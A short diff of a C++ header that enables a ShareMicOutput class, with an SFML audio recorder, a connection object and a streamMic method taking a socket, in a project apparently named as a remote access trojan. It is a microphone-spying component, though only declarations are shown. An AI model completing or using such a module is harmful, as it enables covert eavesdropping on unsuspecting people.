@@ -6,26 +6,26 @@
 #define ADVANCED_RAT2_SHAREMICOUTPUT_H
 
 #include <iostream>
+#include <SFML/Audio.hpp>
+#include "Connection.h"
 #include <Windows.h>
-//#include <SFML/Audio.hpp>
-//#include "Connection.h"
 
 using namespace std;
 
 
 class ShareMicOutput {
 
-//    Connection *connection;
-//    sf::SoundBufferRecorder recorder;
-//    sf::SoundBuffer *buffer;
+    Connection *connection;
+    sf::SoundBufferRecorder recorder;
+    sf::SoundBuffer *buffer;
 
 
 public:
 
-//    //Constructor
-//    ShareMicOutput();
-//
-//    void streamMic(SOCKET socket);
+    //Constructor
+    ShareMicOutput();
+
+    void streamMic(SOCKET socket);
 
 
 };
